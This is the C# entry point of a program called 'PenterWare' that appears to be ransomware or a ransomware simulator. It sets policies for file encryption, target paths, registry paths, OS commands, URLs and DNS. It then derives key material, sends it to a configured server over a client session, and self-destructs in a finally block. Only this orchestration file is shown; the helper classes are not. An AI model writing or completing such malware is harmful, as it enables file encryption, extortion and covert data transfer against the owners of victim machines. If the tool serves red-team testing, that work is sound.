using System;
using PenterWare.Actions;
using PenterWare.Actions.Results;
using PenterWare.Network;
using PenterWare.Network.Clients;
using PenterWare.Utils;

namespace PenterWare;

internal class Program
{
	private static void Main(string[] args)
	{
		InitPolicy();
		try
		{
			ActionResult toSend = new KeyDerivationAction().RunAction();
			Client client = Client.ClientFactory(ResourceData.ServerIP, ResourceData.Port, ResourceData.Transport);
			Session session = new Session(client);
			GeneralUtils.Log($"Starting session with {client.ServerAddress}:{client.ServerPort}");
			session.StartSession(toSend);
		}
		catch (Exception arg)
		{
			GeneralUtils.Log($"Exception occured: {arg}");
		}
		finally
		{
			GeneralUtils.SelfDestruct();
		}
	}

	private static void InitPolicy()
	{
		Policy.SetEncryptionMode();
		Policy.SetPathsToAccess();
		Policy.SetOsCommands();
		Policy.SetPathSuffixRegex();
		Policy.SetInitialTargetPaths();
		Policy.SetRegistryPaths();
		Policy.SetUrls();
		Policy.SetDNSs();
		Policy.SetMaxBytesForEncryption();
		Policy.SetStrings();
	}
}
